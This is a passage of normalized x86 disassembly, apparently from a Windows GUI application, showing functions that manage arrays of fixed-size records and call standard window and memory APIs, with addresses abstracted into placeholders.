mov ecx [ esp + 0xc ]
mov edx [ ecx ]
mov ecx [ esp + 0x50 ]
mov [ ecx + eax * 4 ] edx
mov eax ebx
lea edx [ eax * 4 ]
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
sub eax edx
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
push eax
call [ LocalFree@IAT ]
lea ecx [ ebx * 4 ]
mov eax esi
sub eax ecx
mov ecx [ edi + 0x8 ]
cmp ecx ebx
ja r-xdata
sub eax edx
mov eax [ esp + 0x90 ]
xor ebx ebx
cmp eax edi
mov esi 0xf
mov [ esp + 0xe4 ] esi
mov [ esp + 0xe0 ] ebx
mov [ esp + 0xd0 ] bl
jb r-xdata
mov eax [ esp + 0xd0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push 0x23
push 0x1
lea ecx [ esp + 0x80 ]
call sub_4017f0
dec esi
jne r-xdata
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov eax [ esp + 0x64 ]
lea ecx [ eax + ecx * 4 ]
lea eax [ ebx * 4 ]
mov [ esp + 0xc ] ecx
mov ecx eax
mov eax esi
sub eax ecx
mov ecx [ edi + 0x8 ]
cmp ecx ebx
ja r-xdata
sub eax edx
mov edx [ edi + 0x4 ]
mov ecx [ edx + ebx * 4 ]
mov edx [ ecx + eax * 4 ]
mov eax [ rw-data ]
push edi
mov [ eax + edx * 4 ] 0x0
lea eax [ esi + 0x1 ]
push eax
push edi
push esi
lea ecx [ esp + 0x80 ]
push ecx
mov ecx rw-data
mov [ esp + 0x100 ] esi
call sub_4aad70
mov esi [ esp + 0x70 ]
mov edi [ esp + 0x74 ]
mov ebx [ esp + 0x50 ]
jmp r-xdata
sub ebx ecx
mov [ esp + 0x90 ] esi
mov [ esp + 0x8c ] ebx
mov [ esp + 0x7c ] 0x0
jmp r-xdata
mov ecx [ esp + 0x7c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0xc ]
mov edx [ edx + ebx * 4 ]
mov ecx [ ecx ]
mov ebx [ esp + 0x50 ]
mov [ edx + eax * 4 ] ecx
inc esi
jmp r-xdata
sub ebx ecx
mov ecx [ esp + 0x70 ]
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x38 ]
mov ebx [ esp + 0x30 ]
mov edi [ esp + 0x10 ]
mov esi [ esp + 0x14 ]
add edx ecx
mov ecx [ esp + 0xc ]
add eax esi
inc ebx
add edi 0x70
cmp eax ecx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x10 ] edi
mov [ esp + 0x38 ] eax
mov [ esp + 0x2c ] edx
jne r-xdata
sub_4ac6d0
mov eax [ fs : 0x0 ]
mov ecx [ esp + 0x8 ]
push 0xffffffff
push sub_4c1eb8
push eax
mov [ fs : 0x0 ] esp
mov eax [ ecx + 0x4 ]
sub esp 0x10
push ebx
push ebp
xor ebx ebx
cmp eax ebx
push esi
push edi
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x1c ] ecx
call sub_404310
mov eax [ rw-data ]
mov edi [ esp + 0x10 ]
mov [ esp + 0x28 ] ebx
xor esi esi
mov edi [ rw-data ]
mov ebp rw-data
mov [ esp + 0x18 ] ebp
mov ecx [ esp + 0x30 ]
mov edx [ eax + esi * 4 ]
cmp ecx edx
jg r-xdata
cmp esi ecx
jge r-xdata
mov eax edi
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov esi edx
mov edx edi
sub edx esi
mov esi [ ebp + 0x8 ]
cmp esi ecx
ja r-xdata
cmp edi eax
je r-xdata
mov edx [ rw-data ]
mov ecx [ edx + esi * 4 ]
cmp ecx ebx
je r-xdata
mov ecx edx
add ecx edi
mov [ eax + esi * 4 ] ecx
mov eax [ rw-data ]
mov ebp [ ebp + 0x4 ]
mov ecx [ ebp + ecx * 4 ]
mov ebx [ esp + 0x30 ]
cmp ebx [ ecx + edx * 4 ]
jg r-xdata
sub ecx esi
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc esi
jmp r-xdata
mov eax [ eax + esi * 4 ]
mov [ ecx ] eax
call sub_439ed0
mov eax [ rw-data ]
mov ebp [ esp + 0x18 ]
inc edi
jmp r-xdata
lea edx [ eax * 4 ]
mov ecx edi
sub ecx edx
cmp esi eax
ja r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov esi edx
xor esi esi
jmp r-xdata
cmp eax ebx
jne r-xdata
cmp ebp rw-data
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea eax [ ecx + edx ]
jne r-xdata
mov eax [ ebp + eax * 4 ]
mov edx [ eax + ecx * 4 ]
lea eax [ eax + ecx * 4 ]
mov ecx [ esp + 0x10 ]
add edx ecx
mov [ eax ] edx
sub eax esi
mov ebp [ esp + 0x10 ]
cmp ebp edi
jle r-xdata
mov ecx [ esp + 0x10 ]
mov ebp edx
mov esi edx
lea edi [ edx + ecx ]
imul esi esi 0x70
sub ebp eax
imul edi edi 0x70
inc ebp
mov ecx [ esp + 0x10 ]
sub esp 0x70
mov eax esp
lea ebx [ esi + ecx ]
mov ecx 0xf
mov [ eax + 0x18 ] ecx
xor edi edi
mov [ eax + 0x14 ] edi
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x6c ] ecx
mov [ esp + 0x84 ] esp
mov [ eax + 0x68 ] edi
push ebx
mov ecx rw-data
mov [ eax + 0x58 ] 0x0
call sub_42cdb0
mov eax [ esp + 0x30 ]
lea edx [ esi - 0x1 ]
cmp edx eax
mov [ esp + 0x14 ] edx
jl r-xdata
mov ecx [ rw-data ]
cmp ecx edi
je r-xdata
mov esi eax
imul esi esi 0x70
mov eax [ rw-data ]
lea edx [ esi + eax ]
lea ecx [ edi + eax ]
push edx
call sub_402540
sub esi 0x70
sub edi 0x70
dec ebp
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x30 ]
xor edi edi
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
mov esi [ rw-data ]
mov eax esi
sub eax ecx
sar eax 0x2
cmp eax edi
jbe r-xdata
mov edx [ esp + 0x34 ]
mov eax [ edx + 0x4 ]
mov ecx [ rw-data ]
add eax edi
add ecx esi
push eax
call sub_402540
add edi 0x70
add esi 0x70
dec ebp
jne r-xdata
mov edx [ esp + 0x14 ]
mov ebp [ esp + 0x10 ]
xor edi edi
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp ebx eax
mov [ esp + 0x34 ] edi
jbe r-xdata
mov edx [ esp + 0x30 ]
mov eax [ rw-data ]
push 0x1
push edi
push edx
push eax
call sub_485220
add esp 0x10
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x20 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1c
retn
movzx ecx dx
shl ecx 0x10
or ecx 0x1
push ecx
push 0x1
push 0x406
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] edx
mov [ rw-data ] edi
je r-xdata
jae r-xdata
lea edx [ esp + 0x34 ]
push edx
sub ebx eax
push ebx
push ecx
mov eax esp
mov ecx rw-data
mov [ eax ] esi
call sub_42c680
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov ebp [ esp + 0x10 ]
jmp r-xdata
mov eax edx
cmp eax [ esp + 0x30 ]
jl r-xdata
lea ebx [ ecx + ebx * 4 ]
cmp ebx esi
je r-xdata
cmp ebp edi
jle r-xdata
lea edx [ eax + ebp ]
shl edx 0x2
lea esp [ esp ]
mov [ rw-data ] ebx
mov eax [ esp + 0x30 ]
shl eax 0x2
mov edx ebp
jmp r-xdata
mov esi [ ecx + eax * 4 ]
mov [ edx + ecx ] esi
mov ecx [ esp + 0x30 ]
dec eax
sub edx 0x4
cmp eax ecx
mov ecx [ rw-data ]
jge r-xdata
mov ebp [ esp + 0x10 ]
mov [ eax + ecx ] edi
add eax 0x4
dec edx
jne r-xdata
mov ecx [ rw-data ]
sub_4aca30
push 0xffffffff
push sub_4c1ed8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ esp + 0x2c ]
push ebx
mov ebx [ esp + 0x2c ]
push ebp
lea ecx [ ebx + eax ]
push esi
mov [ esp + 0xc ] ecx
mov ecx rw-data
push edi
mov [ esp + 0x1c ] ecx
call sub_404310
mov eax [ rw-data ]
xor esi esi
mov [ esp + 0x30 ] esi
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov esi [ rw-data ]
mov edi rw-data
mov ecx [ eax + esi * 4 ]
cmp ebx ecx
jg r-xdata
cmp esi ecx
jge r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
mov ebp eax
sar ebp 0x2
mov ecx ebp
lea edx [ ecx * 4 ]
mov eax edx
mov edx esi
sub edx eax
mov eax [ edi + 0x8 ]
cmp eax ecx
ja r-xdata
cmp esi eax
je r-xdata
inc esi
jmp r-xdata
mov edx [ esp + 0x10 ]
dec edx
cmp edx ecx
jl r-xdata
mov ebx [ edi + 0x4 ]
mov ecx [ ebx + ecx * 4 ]
mov ebx [ esp + 0x38 ]
cmp ebx [ ecx + edx * 4 ]
jg r-xdata
sub ecx eax
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ esp + 0x3c ]
sub [ eax + esi * 4 ] ecx
mov edx [ rw-data ]
mov ecx [ edx + esi * 4 ]
test ecx ecx
je r-xdata
mov [ eax + esi * 4 ] 0xffffffff
mov edx [ rw-data ]
mov edi [ edx + esi * 4 ]
test edi edi
lea ebp [ edx + esi * 4 ]
je r-xdata
inc esi
jmp r-xdata
mov ecx ebp
lea edx [ ecx * 4 ]
mov ebx edx
mov edx esi
sub edx ebx
cmp eax ecx
ja r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov edx [ eax + esi * 4 ]
mov [ ecx ] edx
call sub_439ed0
mov [ ebp ] 0x0
mov eax [ rw-data ]
inc esi
jmp r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add eax ecx
cmp edi rw-data
jne r-xdata
mov ebx [ edi + 0x4 ]
mov ebx [ ebx + ecx * 4 ]
mov ecx [ esp + 0x10 ]
dec ecx
cmp ecx [ ebx + edx * 4 ]
jl r-xdata
sub ecx eax
mov eax [ esp + 0x38 ]
sub esp 0x70
mov eax esp
mov ecx 0xf
mov [ eax + 0x18 ] ecx
mov [ eax + 0x14 ] edi
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x6c ] ecx
mov ecx esi
mov [ esp + 0xb0 ] esp
push ecx
mov [ eax + 0x68 ] edi
mov ecx ebx
mov [ eax + 0x58 ] 0x0
call sub_42cdb0
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x10 ]
cmp eax ecx
jge r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
sub edx esi
xor edi edi
cmp ebx edi
mov ebp edx
mov [ esp + 0x14 ] ebp
je r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
lea edx [ ebp * 4 ]
mov ecx esi
sub ecx edx
cmp eax ebp
ja r-xdata
mov ecx ebp
lea edx [ ecx * 4 ]
mov ebx edx
mov edx esi
sub edx ebx
cmp eax ecx
ja r-xdata
sub esp 0x70
mov eax esp
mov ecx 0xf
mov [ eax + 0x18 ] ecx
mov [ eax + 0x14 ] edi
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x6c ] ecx
mov [ esp + 0xac ] esp
mov [ eax + 0x68 ] edi
push ebp
mov ecx rw-data
mov [ eax + 0x58 ] 0x0
call sub_42cdb0
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov edi [ esp + 0x10 ]
mov esi eax
imul edi edi 0x70
imul esi esi 0x70
sub ebp eax
jmp r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov esi eax
mov ebp ecx
imul esi esi 0x70
sub ebp eax
mov eax [ edi + 0x4 ]
mov eax [ eax + ebp * 4 ]
mov edx [ eax + ecx * 4 ]
lea eax [ eax + ecx * 4 ]
mov ecx [ esp + 0x3c ]
sub edx ecx
mov [ eax ] edx
sub ebp eax
mov eax [ edi + 0x4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ eax + edx * 4 ]
mov edx [ rw-data ]
imul ecx ecx 0x70
mov eax [ ecx + edx + 0x20 ]
sub [ rw-data ] eax
mov eax ebp
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
sub ecx eax
mov ebx [ rw-data ]
cmp ebx edi
mov esi [ rw-data ]
jne r-xdata
mov edx [ rw-data ]
mov ecx edx
sub ecx eax
sar ecx 0x2
cmp ecx edi
jbe r-xdata
lea eax [ edi + ecx ]
add ecx esi
push eax
call sub_402540
add esi 0x70
add edi 0x70
dec ebp
jne r-xdata
cmp eax ebp
jge r-xdata
mov edx [ rw-data ]
mov ecx [ ebx + 0x4 ]
lea eax [ esi + edx ]
add ecx edi
push eax
call sub_402540
add esi 0x70
add edi 0x70
dec ebp
jne r-xdata
mov ecx [ rw-data ]
mov ebp [ esp + 0x14 ]
xor edi edi
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
push eax
call [ LocalFree@IAT ]
lea ecx [ ebp * 4 ]
mov eax esi
sub eax ecx
mov ecx [ edi + 0x8 ]
cmp ecx ebp
ja r-xdata
sub eax edx
mov ecx esi
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x38 ]
cmp ecx ebp
jge r-xdata
mov ecx [ rw-data ]
nop
mov ebp [ esp + 0x14 ]
xor edi edi
mov edx [ edi + 0x4 ]
mov ecx [ edx + ebp * 4 ]
mov edx [ ecx + eax * 4 ]
mov eax [ rw-data ]
push edi
mov [ eax + edx * 4 ] 0x0
lea eax [ esi + 0x1 ]
push eax
push edi
push esi
lea ecx [ esp + 0x24 ]
push ecx
mov ecx rw-data
mov [ esp + 0x34 ] esi
call sub_4aad70
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
jmp r-xdata
sub ebp ecx
cmp ebx edi
mov [ rw-data ] edi
jne r-xdata
movzx edx dx
shl edx 0x10
or edx 0x1
push edx
push 0x1
push 0x406
push eax
call [ SendMessageA@IAT ]
mov esi [ rw-data ]
mov ebx [ rw-data ]
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] edx
je r-xdata
cmp eax edi
mov [ esp + 0x3c ] edi
jne r-xdata
mov edx [ esp + 0x10 ]
shl edx 0x2
jmp r-xdata
mov ecx esi
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx edx
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov esi [ edx + eax ]
mov [ eax + ecx * 4 ] esi
mov eax [ rw-data ]
inc ecx
add edx 0x4
cmp ecx ebp
jl r-xdata
cmp ebx edi
je r-xdata
dec ecx
mov ecx [ esp + 0x38 ]
cmp ecx edx
jl r-xdata
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp ecx ebp
jae r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
cmp eax edi
je r-xdata
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x38 ] edx
jne r-xdata
mov ecx edx
sub ecx eax
sar ecx 0x2
cmp ebp ecx
jae r-xdata
mov ecx edx
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] edi
je r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx edi
mov [ eax ] edx
jne r-xdata
mov eax [ rw-data ]
push 0x1
push edi
push ecx
push eax
call sub_485220
add esp 0x10
lea eax [ eax + ebp * 4 ]
cmp eax edx
je r-xdata
lea eax [ esp + 0x3c ]
push eax
sub ebp ecx
push ebp
push ecx
mov eax esp
mov ecx rw-data
mov [ eax ] edx
call sub_42c680
jmp r-xdata
mov ecx [ rw-data ]
push edi
push edi
push edi
push edi
push edi
push ecx
mov [ rw-data ] edi
call sub_466930
mov edx [ rw-data ]
add esp 0x18
push edi
push edi
push edx
call [ InvalidateRect@IAT ]
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx edi
mov [ eax ] edx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov [ rw-data ] eax
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x24
retn
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_4acfa0
push 0xffffffff
push sub_4c1f53
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_4ab480
xor ecx ecx
lea eax [ esi + 0x8 ]
mov [ esi ] r--data
mov [ esp + 0x10 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x20 ]
sub eax ecx
inc eax
push eax
push ecx
mov [ esp + 0x1c ] 0x1
mov [ esi + 0x4 ] ecx
call sub_4aca30
mov ecx [ esp + 0x14 ]
add esp 0xc
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
sub_4ad070
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
push esi
mov esi [ ecx + 0x10 ]
mov ecx [ ecx + 0x4 ]
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
pop esi
shr eax 0x1f
add edx eax
push 0x0
push edx
push ecx
call sub_4aca30
add esp 0xc
xor eax eax
retn
mov ecx [ ecx + 0x4 ]
xor edx edx
push edx
push edx
push ecx
call sub_4aca30
add esp 0xc
xor eax eax
retn
sub_4ad0c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4c1f06
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1a4
push ebx
push ebp
xor ebx ebx
mov eax 0xf
push esi
push edi
mov [ esp + 0x14 ] ecx
mov [ esp + 0x48 ] eax
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x9c ] eax
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
or eax 0xffffffff
mov [ esp + 0x68 ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x6c ] eax
mov al [ esp + 0x27 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x1bc ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x18 ] al
call sub_448010
mov [ esp + 0x1c ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ esp + 0x1c ]
mov [ eax + 0x4 ] eax
mov eax [ esp + 0x1c ]
mov [ eax ] eax
mov eax [ esp + 0x1c ]
mov [ eax + 0x8 ] eax
mov [ esp + 0x20 ] ebx
xor ebp ebp
mov [ esp + 0x1bc ] 0x1
xor edi edi
lea esp [ esp ]
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x4 ]
dec eax
mov ebp 0x1
mov [ esp + 0x28 ] 0xffffffff
js r-xdata
lea edx [ edi + esi ]
push edx
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x20 ]
call sub_448ca0
inc ebp
add edi 0x70
jmp r-xdata
cmp ebp edx
jge r-xdata
mov eax [ esp + 0x28 ]
cmp eax 0xffffffff
jne r-xdata
mov edx eax
imul edx edx 0x70
lea ecx [ edx + esi + 0x38 ]
mov esi [ rw-data ]
cmp esi ebx
jne r-xdata
imul eax eax 0x70
push 0xffffffff
add eax esi
push ebx
push eax
lea ecx [ esp + 0x3c ]
call sub_401dd0
cmp [ esp + 0x48 ] 0x10
mov eax [ esp + 0x34 ]
jae r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
imul eax eax 0x70
push 0xffffffff
add eax esi
push ebx
push eax
lea ecx [ esp + 0x3c ]
call sub_401dd0
mov eax [ esp + 0x48 ]
mov edi 0x10
cmp eax edi
mov eax [ esp + 0x34 ]
jae r-xdata
mov [ esp + 0x28 ] eax
jmp r-xdata
dec eax
sub ecx 0x70
cmp eax ebx
jge r-xdata
push eax
call sub_458010
mov ecx [ esp + 0x48 ]
add esp 0x4
cmp eax ecx
ja r-xdata
lea eax [ esp + 0x34 ]
push eax
call sub_457f90
mov esi eax
mov eax [ esp + 0x4c ]
add esp 0x4
cmp eax edi
mov eax [ esp + 0x34 ]
jae r-xdata
lea eax [ esp + 0x34 ]
cmp [ ecx ] 0xffffffff
jne r-xdata
jmp r-xdata
sub eax ecx
push ebx
push eax
lea ecx [ esp + 0x38 ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0x38 ]
call sub_401ba0
jmp r-xdata
push eax
call sub_458010
mov edi eax
mov eax [ esp + 0x48 ]
add esp 0x4
cmp esi eax
ja r-xdata
lea eax [ esp + 0x34 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xb4 ]
push eax
lea ecx [ esp + 0x38 ]
call sub_401cc0
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0xa4 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_448ca0
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc ebp
cmp al bl
mov [ esp + 0xa8 ] ecx
je r-xdata
push ebp
lea edx [ esp + 0xb4 ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ esp + 0xbc ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov ecx esi
sub ecx eax
push ebx
push ecx
lea ecx [ esp + 0x38 ]
call sub_4017f0
push 0xffffffff
push esi
lea ecx [ esp + 0x38 ]
call sub_401ba0
jmp r-xdata
mov esi [ rw-data ]
mov esi [ esp + 0x14 ]
mov edi [ esi + 0xc ]
add esi 0x8
cmp edi ebx
je r-xdata
lea ecx [ ecx ]
sub edi esi
inc edi
cmp edi ebx
jle r-xdata
lea edx [ esp + 0x30 ]
push edx
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_407bb0
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x4 ]
push esi
push ecx
call sub_4ac6d0
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
add esp 0x8
push eax
push ecx
lea edx [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x1c8 ] bl
call sub_448f60
mov eax [ esp + 0x1c ]
push eax
call j_sub_4b66ed#2
mov eax [ esp + 0xa0 ]
mov esi 0x10
add esp 0x4
cmp eax esi
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
jb r-xdata
mov ebp [ esi + 0x8 ]
cmp edi ebp
je r-xdata
push 0x23
push 0x1
lea ecx [ esp + 0x38 ]
call sub_4017f0
dec edi
jne r-xdata
jmp r-xdata
cmp [ esp + 0x48 ] esi
mov [ esp + 0x9c ] 0xf
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
jb r-xdata
mov ecx [ esp + 0x88 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
mov ecx [ esp + 0x1b4 ]
pop edi
xor eax eax
mov [ fs : 0x0 ] ecx
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x34 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_401a90
add edi 0x70
cmp edi ebp
jne r-xdata
sub_4ad450
push ecx
mov eax [ rw-data ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
cmp [ eax ] 0x1
je r-xdata
pop ecx
retn
push esi
mov esi [ rw-data ]
cmp esi 0x3
je r-xdata
pop esi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x4 ] edx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp esi 0x2
je r-xdata
push edi
mov ecx rw-data
call sub_403b20
mov eax [ rw-data ]
sub eax [ rw-data ]
inc eax
push eax
mov ecx rw-data
call sub_42cee0
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov esi eax
cmp esi ecx
jg r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov eax [ rw-data ]
mov [ rw-data ] eax
je r-xdata
push eax
push eax
mov [ rw-data ] 0x3
call sub_4aa930
push 0x93
push 0x94
call sub_458630
add esp 0x10
pop edi
mov edi esi
imul edi edi 0x70
mov edi edi
mov [ rw-data ] eax
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx [ rw-data ]
lea edx [ edi + ecx ]
mov ecx esi
sub ecx eax
mov eax [ rw-data ]
imul ecx ecx 0x70
push edx
add ecx eax
call sub_402540
mov eax [ rw-data ]
inc esi
add edi 0x70
cmp esi eax
mov eax [ rw-data ]
jle r-xdata
mov edx [ rw-data ]
mov [ rw-data ] edx
jmp r-xdata
sub_4ad5a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1f6b
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x8
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x10 ] edx
je r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ rw-data ]
mov eax 0x2
cmp ecx eax
jge r-xdata
mov eax [ rw-data ]
mov ebp [ rw-data ]
mov [ rw-data ] edi
mov [ esp + 0x10 ] eax
cmp [ rw-data ] edi
mov ebp [ rw-data ]
je r-xdata
mov ecx rw-data
call sub_403b20
push ebx
mov ecx rw-data
call sub_42cee0
cmp ebp esi
jg r-xdata
mov [ esp + 0x10 ] ebp
jmp r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
je r-xdata
mov esi ebp
imul esi esi 0x70
jmp r-xdata
mov esi [ esp + 0x10 ]
mov ecx esi
sub ecx ebp
lea ebx [ ecx + 0x1 ]
mov ecx rw-data
call sub_4010f0
cmp ebx eax
je r-xdata
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
jmp r-xdata
mov ecx rw-data
call sub_4010f0
mov ecx rw-data
mov esi eax
call sub_4010f0
cmp esi eax
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
lea eax [ esi + edx ]
add ecx edi
push eax
call sub_402540
add esi 0x70
add edi 0x70
dec ebx
jne r-xdata
push 0x18
call sub_4b573e
add esp 0x4
mov [ esp + 0x14 ] eax
test eax eax
mov [ esp + 0x20 ] 0x0
je r-xdata
mov edx [ esp + 0x10 ]
push edx
push ebp
mov ecx eax
call sub_4acfa0
sub_4ad750
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1f29
